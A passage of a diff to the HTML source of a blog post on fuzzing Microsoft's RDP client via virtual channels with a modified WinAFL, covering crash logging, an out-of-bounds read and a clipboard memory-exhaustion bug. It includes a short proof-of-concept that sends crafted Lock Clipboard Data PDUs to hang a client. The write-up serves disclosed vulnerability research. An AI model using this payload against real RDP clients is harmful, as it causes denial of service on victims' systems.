@@ -7,7 +7,7 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.89.4" />
+<meta name="generator" content="Hugo 0.95.0" />
 
 <link rel="canonical" href="https://thalium.github.io/blog/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/">
 <meta property="og:title" content="Fuzzing Microsoft&#39;s RDP Client using Virtual Channels: Overview &amp; Methodology" />
@@ -356,10 +356,10 @@ As a drawback, DynamoRIO will add some overhead, but execution speed will still 
 <p>In-app persistence seems the most adapted to our case. More generally, it seems adapted to cases like fuzzing an interpreter or a network listener, which already loop on reading input or receiving packets. However, it is not ideal because code coverage measurement will not stop at <code>return</code>.</p>
 <p>So what is this <strong>no-loop mode</strong>, you ask me? Well, I&rsquo;m not sure myself &ndash; it is not <a href="https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md">documented</a> (at least at the time I am writing this article). I just happened to stumble upon it while reading WinAFL&rsquo;s codebase, and it proves to be totally fit for our network context!</p>
 <p>The no-loop mode lets the program loop by its own, just like in-app persistence. But it has the advantage of stopping coverage measurement at <code>return</code>. Funnily enough, the source code of WinAFL itself hints that it is the preferred mode for network fuzzing.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* We don&#39;t need to reload context in case of network-based fuzzing. */</span>
-<span style="color:#66d9ef">if</span> (options.no_loop)
-    <span style="color:#66d9ef">return</span>;
-</code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* We don&#39;t need to reload context in case of network-based fuzzing. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (options.no_loop)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span></code></pre></div><hr>
 <p>Last but not least about execution of the RDP client while fuzzing. I did mention the function we target should be fuzzed in a loop without restarting the process. However, it will still restart from time to time: for instance, when reaching the max number of fuzzing iterations (<code>-fuzz_iterations</code> parameter), or simply because of crashes (if we find some).</p>
 <p>Since fuzzing campaigns usually last many hours, we can&rsquo;t be there every time the fuzzer restarts the client to click &ldquo;Connect&rdquo; and select a user account. Fuzzing should entirely happen without human intervention.</p>
 <p>Therefore, we need the RDP client to be able to connect autonomously to the server. This is easily done with a little trick: use <strong>cmdkey</strong> to store credentials (<code>cmdkey -generic &lt;ip&gt; -user User -pass 123</code>) and then start the RDP client with <code>mstsc.exe /v &lt;ip&gt;</code>.</p>
@@ -395,10 +395,10 @@ As a drawback, DynamoRIO will add some overhead, but execution speed will still 
 </ol>
 <p>This is easily done with the <strong>WTS API</strong> I mentioned earlier, which allows to open, read from and write to a channel.</p>
 <p>For instance, you can open a channel this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, <span style="color:#e6db74">&#34;RDPSND&#34;</span>, <span style="color:#ae81ff">0</span>);
-</code></pre></div><p>And you can write to a channel this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">WTSVirtualChannelWrite(virtual_channel, buffer, length, <span style="color:#f92672">&amp;</span>bytes_written);
-</code></pre></div><p>All that remains is to <strong>modify WinAFL</strong> so that instead of writing mutations to a file, it <strong>sends them over TCP</strong> to our VC Server. This can be done by patching the function <code>write_to_testcase</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, <span style="color:#e6db74">&#34;RDPSND&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>And you can write to a channel this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WTSVirtualChannelWrite(virtual_channel, buffer, length, <span style="color:#f92672">&amp;</span>bytes_written);
+</span></span></code></pre></div><p>All that remains is to <strong>modify WinAFL</strong> so that instead of writing mutations to a file, it <strong>sends them over TCP</strong> to our VC Server. This can be done by patching the function <code>write_to_testcase</code>.</p>
 <p>Here&rsquo;s what our fuzzing « architecture » resembles now.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
@@ -457,7 +457,7 @@ As a drawback, DynamoRIO will add some overhead, but execution speed will still 
 <li>&hellip;</li>
 </ul>
 <p>With a good picture of the channel in mind, we can now start reversing the RDP client. We need to locate <strong>where incoming PDUs</strong> in the channel are <strong>handled</strong>.</p>
-<p>Unfortunately, the way channels globally work in RDP is somewhat circuitous and I never got around to fully figuring it out. Besides, each channel is architectured in a different fashion; there is rarely a common code structure or even naming convention between two channels' implementation.</p>
+<p>Unfortunately, the way channels globally work in RDP is somewhat circuitous and I never got around to fully figuring it out. Besides, each channel is architectured in a different fashion; there is rarely a common code structure or even naming convention between two channels&rsquo; implementation.</p>
 <p>Thanksfully, the PDB symbols are enough to identify most of the channel handlers. Strings or magic numbers from the specification can also help. For RDPSND, our target method&rsquo;s name is rather straightforward.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
@@ -552,48 +552,48 @@ As a drawback, DynamoRIO will add some overhead, but execution speed will still 
 </ul>
 <p>Too often I found crashes that I couldn&rsquo;t reproduce and had no idea how to analyze. To try and mitigate this a bit, I <strong>modified</strong> WinAFL to incorporate a feature that proved to be rather vital during my research: <strong>logging more information about crashes</strong>.</p>
 <p>More specifically, everytime a crash is encountered, WinAFL/DynamoRIO will now log the exception address, module and offset, timestamp, and also exception information (like if there&rsquo;s an access violation on read, which address was tried to be read).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ((exception_code <span style="color:#f92672">==</span> EXCEPTION_ACCESS_VIOLATION) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> EXCEPTION_ILLEGAL_INSTRUCTION) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> EXCEPTION_PRIV_INSTRUCTION) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> EXCEPTION_INT_DIVIDE_BY_ZERO) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> STATUS_HEAP_CORRUPTION) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> EXCEPTION_STACK_OVERFLOW) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> STATUS_STACK_BUFFER_OVERRUN) <span style="color:#f92672">||</span>
-    (exception_code <span style="color:#f92672">==</span> STATUS_FATAL_APP_EXIT)) {
-        <span style="color:#66d9ef">if</span>(options.debug_mode) {
-            dr_fprintf(winafl_data.log, <span style="color:#e6db74">&#34;crashed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        } <span style="color:#66d9ef">else</span> {
-            mod_entry <span style="color:#f92672">=</span> module_table_lookup(winafl_data.cache, NUM_THREAD_MODULE_CACHE, module_table, (app_pc)excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress);
-
-            file_t crash_log <span style="color:#f92672">=</span> dr_open_file(<span style="color:#e6db74">&#34;crash.log&#34;</span>, DR_FILE_WRITE_APPEND);
-            time_t ltime;
-            time(<span style="color:#f92672">&amp;</span>ltime);
-            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;Crash at time %li</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ltime);
-            <span style="color:#66d9ef">if</span> (mod_entry <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> mod_entry<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">==</span> NULL) {
-                dr_fprintf(
-                    crash_log,
-                    <span style="color:#e6db74">&#34;Exception Address: %016llx / %016llx (unknown module)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
-                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress),
-                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress) <span style="color:#f92672">-</span> module_start
-                );
-            } <span style="color:#66d9ef">else</span> {
-                dr_fprintf(
-                    crash_log,
-                    <span style="color:#e6db74">&#34;Exception Address: %016llx / %016llx (%s)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
-                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress),
-                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress) <span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)mod_entry<span style="color:#f92672">-&gt;</span>data<span style="color:#f92672">-&gt;</span>start,
-                    dr_module_preferred_name(mod_entry<span style="color:#f92672">-&gt;</span>data)
-                );
-            }
-            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;Exception Information: %016llx %016llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionInformation[<span style="color:#ae81ff">0</span>], excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionInformation[<span style="color:#ae81ff">1</span>]);
-            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-            dr_close_file(crash_log);
-            WriteCommandToPipe(<span style="color:#e6db74">&#39;C&#39;</span>);
-            WriteDWORDCommandToPipe(exception_code);
-        }
-        dr_exit_process(<span style="color:#ae81ff">1</span>);
-}
-</code></pre></div><p>This allows to know precisely in <strong>which function</strong> and <strong>which instruction</strong> a crash happened. Usually it&rsquo;s in <code>mstscax.dll</code>, but it could also happen in another module. It is worth noting a crash in an &ldquo;unknown module&rdquo; could mean the execution flow was redirected, which accounts for the most interesting bugs&hellip; :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((exception_code <span style="color:#f92672">==</span> EXCEPTION_ACCESS_VIOLATION) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> EXCEPTION_ILLEGAL_INSTRUCTION) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> EXCEPTION_PRIV_INSTRUCTION) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> EXCEPTION_INT_DIVIDE_BY_ZERO) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> STATUS_HEAP_CORRUPTION) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> EXCEPTION_STACK_OVERFLOW) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> STATUS_STACK_BUFFER_OVERRUN) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (exception_code <span style="color:#f92672">==</span> STATUS_FATAL_APP_EXIT)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(options.debug_mode) {
+</span></span><span style="display:flex;"><span>            dr_fprintf(winafl_data.log, <span style="color:#e6db74">&#34;crashed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            mod_entry <span style="color:#f92672">=</span> module_table_lookup(winafl_data.cache, NUM_THREAD_MODULE_CACHE, module_table, (app_pc)excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            file_t crash_log <span style="color:#f92672">=</span> dr_open_file(<span style="color:#e6db74">&#34;crash.log&#34;</span>, DR_FILE_WRITE_APPEND);
+</span></span><span style="display:flex;"><span>            time_t ltime;
+</span></span><span style="display:flex;"><span>            time(<span style="color:#f92672">&amp;</span>ltime);
+</span></span><span style="display:flex;"><span>            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;Crash at time %li</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ltime);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (mod_entry <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> mod_entry<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>                dr_fprintf(
+</span></span><span style="display:flex;"><span>                    crash_log,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;Exception Address: %016llx / %016llx (unknown module)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress),
+</span></span><span style="display:flex;"><span>                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress) <span style="color:#f92672">-</span> module_start
+</span></span><span style="display:flex;"><span>                );
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                dr_fprintf(
+</span></span><span style="display:flex;"><span>                    crash_log,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;Exception Address: %016llx / %016llx (%s)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress),
+</span></span><span style="display:flex;"><span>                    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionAddress) <span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)mod_entry<span style="color:#f92672">-&gt;</span>data<span style="color:#f92672">-&gt;</span>start,
+</span></span><span style="display:flex;"><span>                    dr_module_preferred_name(mod_entry<span style="color:#f92672">-&gt;</span>data)
+</span></span><span style="display:flex;"><span>                );
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;Exception Information: %016llx %016llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionInformation[<span style="color:#ae81ff">0</span>], excpt<span style="color:#f92672">-&gt;</span>record<span style="color:#f92672">-&gt;</span>ExceptionInformation[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>            dr_fprintf(crash_log, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            dr_close_file(crash_log);
+</span></span><span style="display:flex;"><span>            WriteCommandToPipe(<span style="color:#e6db74">&#39;C&#39;</span>);
+</span></span><span style="display:flex;"><span>            WriteDWORDCommandToPipe(exception_code);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        dr_exit_process(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This allows to know precisely in <strong>which function</strong> and <strong>which instruction</strong> a crash happened. Usually it&rsquo;s in <code>mstscax.dll</code>, but it could also happen in another module. It is worth noting a crash in an &ldquo;unknown module&rdquo; could mean the execution flow was redirected, which accounts for the most interesting bugs&hellip; :)</p>
 <p>Sadly, we can&rsquo;t do much more. Something very valuable would be having a call stack dump on crashes. However, DynamoRIO does not have such a feature, and we can&rsquo;t do it through <code>procdump</code> or <code>MiniDumpWriteDump</code> either because the client is already a debuggee of DynamoRIO (<code>drrun</code>).</p>
 <p>Having the module and offset is already of a huge help in understanding crashes though: start reversing the client where it crashed and work your way backwards.</p>
 <h2 id="assessing-fuzzing-quality">Assessing fuzzing quality</h2>
@@ -689,27 +689,27 @@ c2 b8 b3 0d // dwAudioTimeStamp
 de 20 be ef // Data
 </code></pre><p>Nothing particularly shocking right away. On a purely semantic level, fields that could be good candidates for a crash are <code>wFormatNo</code> or <code>cBlockNo</code>, because they could be used for indexing an array.</p>
 <p>Reversing the <code>OnWaveData</code> function will surely make things clearer. Here&rsquo;s the interesting piece:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">wFormatNo <span style="color:#f92672">=</span> PDU<span style="color:#f92672">-&gt;</span>Body.wFormatNo;
-
-<span style="color:#75715e">// Has wFormatNo changed since the last Wave PDU?
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (wFormatNo <span style="color:#f92672">!=</span> this<span style="color:#f92672">-&gt;</span>lastFormatNo) {
-  <span style="color:#75715e">// Load the new format
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CRdpAudioController<span style="color:#f92672">::</span>OnNewFormat(this, wFormatNo)) {
-    <span style="color:#75715e">// Error, exit
-</span><span style="color:#75715e"></span>  }
-  this<span style="color:#f92672">-&gt;</span>lastFormatNo <span style="color:#f92672">=</span> wFormatNo;
-}
-
-<span style="color:#75715e">// Fetch the audio format of index wFormatNo
-</span><span style="color:#75715e"></span>savedAudioFormats <span style="color:#f92672">=</span> this<span style="color:#f92672">-&gt;</span>savedAudioFormats;
-targetFormat <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(AudioFormat <span style="color:#f92672">**</span>)(savedAudioFormats <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> wFormatNo);
-
-wFormatTag <span style="color:#f92672">=</span> targetFormat<span style="color:#f92672">-&gt;</span>wFormatTag;
-
-<span style="color:#66d9ef">if</span> (wFormatTag <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
-  <span style="color:#75715e">// ...
-</span><span style="color:#75715e"></span>}
-</code></pre></div><p>The out-of-bounds read is quite evident: we control <code>wFormatNo</code> (unsigned short). However, manually sending the malicious PDU again does not do anything &ndash; we are unable to reproduce the bug.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>wFormatNo <span style="color:#f92672">=</span> PDU<span style="color:#f92672">-&gt;</span>Body.wFormatNo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Has wFormatNo changed since the last Wave PDU?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (wFormatNo <span style="color:#f92672">!=</span> this<span style="color:#f92672">-&gt;</span>lastFormatNo) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Load the new format
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CRdpAudioController<span style="color:#f92672">::</span>OnNewFormat(this, wFormatNo)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Error, exit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>  this<span style="color:#f92672">-&gt;</span>lastFormatNo <span style="color:#f92672">=</span> wFormatNo;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Fetch the audio format of index wFormatNo
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>savedAudioFormats <span style="color:#f92672">=</span> this<span style="color:#f92672">-&gt;</span>savedAudioFormats;
+</span></span><span style="display:flex;"><span>targetFormat <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(AudioFormat <span style="color:#f92672">**</span>)(savedAudioFormats <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> wFormatNo);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wFormatTag <span style="color:#f92672">=</span> targetFormat<span style="color:#f92672">-&gt;</span>wFormatTag;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (wFormatTag <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>The out-of-bounds read is quite evident: we control <code>wFormatNo</code> (unsigned short). However, manually sending the malicious PDU again does not do anything &ndash; we are unable to reproduce the bug.</p>
 <p>This is a case of stateful bug in which a <strong>sequence</strong> of PDUs crashed the client, and we only know the last PDU. We&rsquo;re gonna have to manually reconstruct the puzzle pieces!</p>
 <p>Since no length checking seems to be performed on <code>wFormatNo</code> here, the fact that we cannot reproduce the bug must come from the condition above in the code. Indeed, we find out there actually is length checking inside <code>OnNewFormat</code>. We need to find a way to skip this condition to trigger the bug.</p>
 <p>In order to skip the condition, we need to send a format number that is equal to the last one we sent. But to trigger a bug, we want the format number to be bigger than the number of formats; how do we achieve that by not changing the format number?</p>
@@ -785,37 +785,37 @@ wFormatTag <span style="color:#f92672">=</span> targetFormat<span style="color:#
 04 00 00 00 // dataLen
 01 69 63 6B // clipDataId
 </code></pre><p>It is a <em>Lock Clipboard Data PDU</em> (<code>0x000A</code>), which basically only contains a <code>clipDataId</code> field. In the function <code>CClipBase::OnLockClipData</code>, this field is used with some kind of &ldquo;smart array&rdquo; object:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">EnterCriticalSection(...);
-v5 <span style="color:#f92672">=</span> SmartArray<span style="color:#f92672">&lt;</span>CFileContentsReaderManager<span style="color:#f92672">&gt;::</span>AddAt(
-  this,
-  PDU<span style="color:#f92672">-&gt;</span>clipDataId,
-  v9
-) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x8007000E</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
-LeaveCriticalSection(...);
-</code></pre></div><p>Eventually, the function <code>DynArray&lt;SmartArray&lt;RdpStagingSurface,unsigned long&gt;::CCleanType,unsigned long&gt;::Grow</code> is called and performs:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">v5 <span style="color:#f92672">=</span> operator new(saturated_mul(<span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> clipDataId, <span style="color:#ae81ff">8u</span>i64));
-</code></pre></div><p>My guess is that an array of dynamic length is used to store information, such as a lock tag, about file streams based on their id (if this is really the case, then it is probably poor choice of data structure). If the array is not big enough when trying to access a certain index, then it is reallocated with sufficient size.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EnterCriticalSection(...);
+</span></span><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> SmartArray<span style="color:#f92672">&lt;</span>CFileContentsReaderManager<span style="color:#f92672">&gt;::</span>AddAt(
+</span></span><span style="display:flex;"><span>  this,
+</span></span><span style="display:flex;"><span>  PDU<span style="color:#f92672">-&gt;</span>clipDataId,
+</span></span><span style="display:flex;"><span>  v9
+</span></span><span style="display:flex;"><span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x8007000E</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>LeaveCriticalSection(...);
+</span></span></code></pre></div><p>Eventually, the function <code>DynArray&lt;SmartArray&lt;RdpStagingSurface,unsigned long&gt;::CCleanType,unsigned long&gt;::Grow</code> is called and performs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> operator new(saturated_mul(<span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> clipDataId, <span style="color:#ae81ff">8u</span>i64));
+</span></span></code></pre></div><p>My guess is that an array of dynamic length is used to store information, such as a lock tag, about file streams based on their id (if this is really the case, then it is probably poor choice of data structure). If the array is not big enough when trying to access a certain index, then it is reallocated with sufficient size.</p>
 <p>This leads to a <strong>malloc</strong> of size ∳8 \times (32 + \text{clipDataId})∳, which means at maximum a little more than <strong>32 GB</strong>. Of course, on systems with a moderate amount of RAM like an employee&rsquo;s laptop, this may be dangerous.</p>
 <p>Risk-wise, this is a case of <strong>remote system-wide denial of service</strong>. Obviously, it&rsquo;s less impressive on a client than on a server, but it&rsquo;s still nastier than your usual mere crash.</p>
 <p><strong>Microsoft acknowledged the bug, but unsurprisingly closed the case as a <em>low severity DOS vulnerability</em>.</strong> I still think it could have deserved a little fix. Imagine a Windows machine that hosts several critical services, and from which you can connect to another machine through RDP &mdash; since the DOS hangs the entire system, these critical services would be impacted too.</p>
 <p>While writing a PoC, I noticed something interesting. Depending on how much available RAM there is left on the client, you cannot just send a PDU with <code>0xFFFFFFFF</code> as <code>clipDataId</code>. The client will try to allocate <em>too much</em> at once, and malloc will return <code>ERROR_NOT_ENOUGH_MEMORY</code>. But you still need to make the client allocate enough memory to reach death by swap. Thus, my exploit sends the malicious payloads with smaller 128 MB increments to adapt to the amount of RAM on the victim&rsquo;s system.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> {
-    <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x00</span>,             <span style="color:#75715e">// msgType
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,             <span style="color:#75715e">// msgFlags
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// dataLen
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x00</span>  <span style="color:#75715e">// clipDataId
-</span><span style="color:#75715e"></span>};
-
-connect_to_virtual_channel(<span style="color:#e6db74">&#34;cliprdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL);
-
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; c<span style="color:#f92672">++</span>) {
-    payload[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)c; <span style="color:#75715e">// Allocate memory with 128MB increments
-</span><span style="color:#75715e"></span>    write_to_virtual_channel(payload, <span style="color:#66d9ef">sizeof</span>(payload));
-    Sleep(<span style="color:#ae81ff">100</span>);
-}
-
-close_virtual_channel();
-</code></pre></div><p>From this bug, we learned a golden rule of fuzzing: that it is not only about crashes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> {
